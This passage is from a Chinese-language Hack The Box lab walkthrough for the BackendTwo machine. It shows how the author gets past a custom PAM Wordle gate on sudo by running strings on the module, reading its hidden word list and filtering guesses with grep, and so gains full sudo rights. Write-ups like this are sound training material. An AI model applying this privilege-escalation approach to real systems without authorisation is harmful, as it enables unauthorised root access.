+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">htb@BackendTwo:~$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> htb: </span><br><span class="line">--- Welcome to PAM-Wordle! ---</span><br><span class="line"></span><br><span class="line">A five character [a-z] word has been selected.</span><br><span class="line">You have 6 attempts to guess the word.</span><br><span class="line"></span><br><span class="line">After each guess you will recieve a hint <span class="built_in">which</span> indicates:</span><br><span class="line">? - what letters are wrong.</span><br><span class="line">* - what letters are <span class="keyword">in</span> the wrong spot.</span><br><span class="line">[a-z] - what letters are correct.</span><br><span class="line"></span><br><span class="line">--- Attempt 1 of 6 ---</span><br><span class="line">Word: </span><br></pre></td></tr></table></figure>
+
+<p>还要玩猜字游戏。&#x2F;etc&#x2F;pam.d是包含各种自定义模块的目录，里边有一个sudo的配置文件，可以详细的看到sudo 定义关联了哪些：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">htb@BackendTwo:~$ <span class="built_in">cd</span> /etc/pam.d</span><br><span class="line">htb@BackendTwo:/etc/pam.d$ <span class="built_in">ls</span></span><br><span class="line">atd             common-password                other      su</span><br><span class="line">chfn            common-session                 passwd     su-l</span><br><span class="line">chpasswd        common-session-noninteractive  polkit-1   sudo</span><br><span class="line">chsh            cron                           runuser    systemd-user</span><br><span class="line">common-account  login                          runuser-l  vmtoolsd</span><br><span class="line">common-auth     newusers                       sshd</span><br><span class="line">htb@BackendTwo:/etc/pam.d$ <span class="built_in">cat</span> sudo</span><br><span class="line"><span class="comment">#%PAM-1.0</span></span><br><span class="line"></span><br><span class="line">session    required   pam_env.so readenv=1 user_readenv=0</span><br><span class="line">session    required   pam_env.so readenv=1 envfile=/etc/default/locale user_readenv=0</span><br><span class="line">auth    required pam_unix.so</span><br><span class="line">auth    required    pam_wordle.so</span><br><span class="line">@include common-auth</span><br><span class="line">@include common-account</span><br><span class="line">@include common-session-noninteractive</span><br><span class="line">htb@BackendTwo:/etc/pam.d$ </span><br></pre></td></tr></table></figure>
+
+<p>pam_wordle.so看起来像是游戏的答案校验，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">htb@BackendTwo:~$ find / -name pam_wordle.so 2&gt;/dev/null</span><br><span class="line">/usr/lib/x86_64-linux-gnu/security/pam_wordle.so</span><br><span class="line">htb@BackendTwo:~$ strings /usr/lib/x86_64-linux-gnu/security/pam_wordle.so</span><br><span class="line">Q`^B</span><br><span class="line">DICT</span><br><span class="line">fetch_word</span><br><span class="line">regcomp</span><br><span class="line">fopen</span><br><span class="line">strlen</span><br><span class="line">regexec</span><br><span class="line">fgets</span><br><span class="line">fclose</span><br><span class="line">check_word</span><br><span class="line">strncmp</span><br><span class="line">wordle_guess</span><br><span class="line">pam_prompt</span><br><span class="line">pam_sm_authenticate</span><br><span class="line">time</span><br><span class="line">srand</span><br><span class="line">pam_sm_setcred</span><br><span class="line">pam_sm_acct_mgmt</span><br><span class="line">AWAVAUATSH</span><br><span class="line">[A\A]A^A_]</span><br><span class="line">linu</span><br><span class="line">^[abcdefghijklmnopqrstuvwxyz]&#123;5&#125;$</span><br><span class="line">Word: </span><br><span class="line">Invalid guess: unknown word.</span><br><span class="line">Warning: error reading dictionary.</span><br><span class="line">Invalid guess: guess length != word length.</span><br><span class="line">Correct!</span><br><span class="line">Hint-&gt;%s</span><br><span class="line">--- Welcome to PAM-Wordle! ---</span><br><span class="line">A five character [a-z] word has been selected.</span><br><span class="line">You have %d attempts to guess the word.</span><br><span class="line">After each guess you will recieve a hint <span class="built_in">which</span> indicates:</span><br><span class="line">? - what letters are wrong.</span><br><span class="line">* - what letters are <span class="keyword">in</span> the wrong spot.</span><br><span class="line">[a-z] - what letters are correct.</span><br><span class="line">--- Attempt %d of %d ---</span><br><span class="line">You lose.</span><br><span class="line">The word was: %s</span><br><span class="line">;*3$<span class="string">&quot;</span></span><br><span class="line"><span class="string">/opt/.words</span></span><br><span class="line"><span class="string">GCC: (Debian 10.2.1-6) 10.2.1 20210110</span></span><br><span class="line"><span class="string">_DYNAMIC</span></span><br><span class="line"><span class="string">_GLOBAL_OFFSET_TABLE_</span></span><br><span class="line"><span class="string">fgets</span></span><br><span class="line"><span class="string">fetch_word</span></span><br><span class="line"><span class="string">strncmp</span></span><br><span class="line"><span class="string">check_word</span></span><br><span class="line"><span class="string">regcomp</span></span><br><span class="line"><span class="string">fopen</span></span><br><span class="line"><span class="string">srand</span></span><br><span class="line"><span class="string">fclose</span></span><br><span class="line"><span class="string">regexec</span></span><br><span class="line"><span class="string">time</span></span><br><span class="line"><span class="string">wordle_guess</span></span><br><span class="line"><span class="string">DICT</span></span><br><span class="line"><span class="string">pam_sm_setcred</span></span><br><span class="line"><span class="string">strlen</span></span><br><span class="line"><span class="string">pam_sm_authenticate</span></span><br><span class="line"><span class="string">pam_sm_acct_mgmt</span></span><br><span class="line"><span class="string">pam_prompt</span></span><br><span class="line"><span class="string">.symtab</span></span><br><span class="line"><span class="string">.strtab</span></span><br><span class="line"><span class="string">.shstrtab</span></span><br><span class="line"><span class="string">.gnu.hash</span></span><br><span class="line"><span class="string">.dynsym</span></span><br><span class="line"><span class="string">.dynstr</span></span><br><span class="line"><span class="string">.rela.dyn</span></span><br><span class="line"><span class="string">.rela.plt</span></span><br><span class="line"><span class="string">.text</span></span><br><span class="line"><span class="string">.rodata</span></span><br><span class="line"><span class="string">.eh_frame</span></span><br><span class="line"><span class="string">.dynamic</span></span><br><span class="line"><span class="string">.got</span></span><br><span class="line"><span class="string">.got.plt</span></span><br><span class="line"><span class="string">.data</span></span><br><span class="line"><span class="string">.comment</span></span><br><span class="line"><span class="string">htb@BackendTwo:~$ </span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">htb@BackendTwo:/opt$ <span class="built_in">cat</span> .words </span><br><span class="line">write</span><br><span class="line">close</span><br><span class="line">fstat</span><br><span class="line">lstat</span><br><span class="line">lseek</span><br><span class="line">ioctl</span><br><span class="line">readv</span><br><span class="line">msync</span><br><span class="line">shmat</span><br><span class="line">pause</span><br><span class="line">alarm</span><br><span class="line"><span class="built_in">clone</span></span><br><span class="line">vfork</span><br><span class="line">wait4</span><br><span class="line"><span class="built_in">uname</span></span><br><span class="line">semop</span><br><span class="line">shmdt</span><br><span class="line">fcntl</span><br><span class="line">flock</span><br><span class="line">fsync</span><br><span class="line"><span class="built_in">chdir</span></span><br><span class="line"><span class="built_in">mkdir</span></span><br><span class="line"><span class="built_in">rmdir</span></span><br><span class="line">creat</span><br><span class="line"><span class="built_in">chmod</span></span><br><span class="line"><span class="built_in">chown</span></span><br><span class="line"><span class="built_in">umask</span></span><br><span class="line"><span class="built_in">times</span></span><br><span class="line">utime</span><br><span class="line"><span class="built_in">mknod</span></span><br><span class="line">ustat</span><br><span class="line">sysfs</span><br><span class="line">mlock</span><br><span class="line">prctl</span><br><span class="line">mount</span><br><span class="line">tkill</span><br><span class="line">futex</span><br><span class="line">mbind</span><br><span class="line">ppoll</span><br><span class="line">pipe2</span><br><span class="line">setns</span><br><span class="line">rocku</span><br><span class="line">odays</span><br><span class="line">mysql</span><br><span class="line">hacks</span><br><span class="line">cheat</span><br><span class="line">crypt</span><br><span class="line">virus</span><br><span class="line">hydra</span><br><span class="line">creds</span><br><span class="line">cmake</span><br><span class="line">ipsec</span><br><span class="line">javac</span><br><span class="line">leaks</span><br><span class="line">locks</span><br><span class="line">linux</span><br><span class="line">login</span><br><span class="line">nginx</span><br><span class="line">ngrok</span><br><span class="line">nikto</span><br><span class="line">patch</span><br><span class="line">pgsql</span><br><span class="line">posix</span><br><span class="line">proxy</span><br><span class="line">putty</span><br><span class="line">quake</span><br><span class="line">samba</span><br><span class="line">wfuzz</span><br><span class="line">wheel</span><br><span class="line">opsec</span><br><span class="line">shell</span><br><span class="line">worms</span><br><span class="line">union</span><br><span class="line">blind</span><br><span class="line">htb@BackendTwo:/opt$ </span><br></pre></td></tr></table></figure>
+
+<p>很好，现在我好像只用猜这些单词的顺序就可以了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">--- Attempt 1 of 6 ---</span><br><span class="line">Word: write</span><br><span class="line">Hint-&gt;?????</span><br><span class="line">--- Attempt 2 of 6 ---</span><br><span class="line">Word: close</span><br><span class="line">Hint-&gt;*lo??</span><br><span class="line">--- Attempt 3 of 6 ---</span><br><span class="line">Word: </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>lo是正确的，*表示c在错误的位置上，那么可以筛选一下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">htb@BackendTwo:/opt$ <span class="built_in">cat</span> .words |grep l |grep o|grep c| grep -vE <span class="string">&#x27;(t|e)&#x27;</span></span><br><span class="line">flock</span><br><span class="line">mlock</span><br><span class="line">locks</span><br><span class="line">htb@BackendTwo:/opt$ </span><br></pre></td></tr></table></figure>
+
+<p>筛选有l和o还要c但不包含T或e的单词。正确答案是：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">htb@BackendTwo:~$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> htb: </span><br><span class="line">--- Welcome to PAM-Wordle! ---</span><br><span class="line"></span><br><span class="line">A five character [a-z] word has been selected.</span><br><span class="line">You have 6 attempts to guess the word.</span><br><span class="line"></span><br><span class="line">After each guess you will recieve a hint <span class="built_in">which</span> indicates:</span><br><span class="line">? - what letters are wrong.</span><br><span class="line">* - what letters are <span class="keyword">in</span> the wrong spot.</span><br><span class="line">[a-z] - what letters are correct.</span><br><span class="line"></span><br><span class="line">--- Attempt 1 of 6 ---</span><br><span class="line">Word: write</span><br><span class="line">Hint-&gt;?????</span><br><span class="line">--- Attempt 2 of 6 ---</span><br><span class="line">Word: close</span><br><span class="line">Hint-&gt;*lo??</span><br><span class="line">--- Attempt 3 of 6 ---</span><br><span class="line">Word: flock</span><br><span class="line">Hint-&gt;?lock</span><br><span class="line">--- Attempt 4 of 6 ---</span><br><span class="line">Word: mlock</span><br><span class="line">Correct!</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> htb on backendtwo:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User htb may run the following commands on backendtwo:</span><br><span class="line">    (ALL : ALL) ALL</span><br><span class="line">htb@BackendTwo:~$ </span><br></pre></td></tr></table></figure>
+
+<p>可以sudo所有.</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Hack-The-Box/" class="category-chain-item">Hack The Box</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Linux/" class="print-no-link">#Linux</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HTB Walkthrough - BackendTwo</div>
+      <div>https://crazyinside.github.io/post/HackTheBox-BackendTwo.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>CrazyInSide</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>August 14, 2023</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/post/HackTheBox-Bart.html" title="HTB Walkthrough - Bart">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HTB Walkthrough - Bart</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/post/HackTheBox-Backend.html" title="HTB Walkthrough - Backend">
+                        <span class="hidden-mobile">HTB Walkthrough - Backend</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
